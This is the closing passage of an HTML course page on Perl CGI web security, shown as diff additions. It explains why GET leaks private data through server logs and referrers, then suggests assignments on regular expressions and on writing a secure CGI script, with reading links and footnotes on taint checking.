+<li> GET is recorded in server logs, while POST usually is not.  Therefore, anything private sent in a GET request will be logged and backed up by the server administrator -- possibly a privacy violation.</li>
+<li> When you click on a link from one website to another, the original website's URL, <strong>including GET fields</strong>, is sent to the receiving website and will show up in <strong>their</strong> logs -- definitely a security and privacy issue.</li>
+</ul>
+</p>
+<p class="Body">
+Clearly, POST is usually better than GET.  Nonetheless, neither is really secure.  It's still not safe to embed raw passwords or confidential information in either GET or POST.  Use cookies as session keys instead, and read the <a class="link" href="http://www.owasp.org/documentation/appsec_faq.html">AppSec FAQ</a>.
+</p>
+<hr>
+<!--End Section 1-->
+<h2><a name="Suggested Assignments">Suggested Assignments</a></h2>
+<!-- Start SectLevel2 -->
+<h3><a name="Play with RegEx">Play with RegEx</a></h3>
+<p class="Body">
+Spend some time playing with RegEx, grep, and Perl.  Try any of the following:
+<ul>
+<li> Download a <a class="link" href="http://wordlist.sourceforge.net/">dictionary file or word list</a> and grep it for interesting words.</li>
+<li> Write a Perl program that validates e-mail addresses, phone numbers, etc.</li>
+<li> Use regular expressions in some Perl code.</li>
+</ul>
+</p>
+<!--End Section 2-->
+<h3><a name="Write a secure CGI script">Write a secure CGI script</a></h3>
+<p class="Body">
+Try writing a CGI script that takes data from the user and sends an e-mail message or opens a file in a secure way.  Think about what we've learned and be careful.  (Perhaps you should show me the script once you've written it, so we can make sure it's safe to put online.)
+</p>
+<!--End Section 2-->
+<h3><a name="Read more!">Read more!</a></h3>
+<p class="Body">
+Read about CGI and web security at these sites:
+<ul>
+<li> <a class="link" href="http://www.w3.org/Security/Faq/wwwsf4.html">w3.org Security FAQ</a></li>
+<li> <a class="link" href="http://www.extropia.com/tutorials/security/index.html">Introduction to web security</a></li>
+<li> <a class="link" href="http://users.sdsc.edu/~cedwards/securitynotes.html">Perl CGI Security Notes by Chris</a></li>
+</ul>
+</p>
+<hr>
+<p class="Body">
+<a class="link" href=".">Back to Course Index</a>
+</p>
+<!--End Section 2-->
+<!-- End SectLevel2 -->
+<!--End Section 1-->
+<!-- End SectLevel1 -->
+<hr>
+<p class="Body">
+<a name="fNOTE1">&nbsp</a>
+[<a class="link" href="#REFfNOTE1">1</a>] - <a class="link" href="http://en.wikipedia.org/wiki/Regular_expression">http://en.wikipedia.org/wiki/Regular_expression</a>
+<br>
+<a name="fNOTE2">&nbsp</a>
+[<a class="link" href="#REFfNOTE2">2</a>] - Example borrowed from <a class="link" href="http://www.extropia.com/tutorials/security/index.html">http://www.extropia.com/tutorials/security/index.html</a>
+<br>
+<a name="fNOTE3">&nbsp</a>
+[<a class="link" href="#REFfNOTE3">3</a>] - Here, run-time means that the Perl interpreter does taint checking as it interprets your program at run-time -- as the program is running.
+<br>
+<a name="fNOTE4">&nbsp</a>
+[<a class="link" href="#REFfNOTE4">4</a>] - Well, almost.  The only 'good' way to untaint data!
+<br>
+<br>
+<p align="right"> <small>This document was generated using <a class="link" href="http://www.maplefish.com/todd/aft.html">AFT v5.094</a></small> </p>
+<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
+</script>
+<script type="text/javascript">
+_uacct = "UA-148948-3";
+urchinTracker();
+</script>
+</body>
+</html>
+
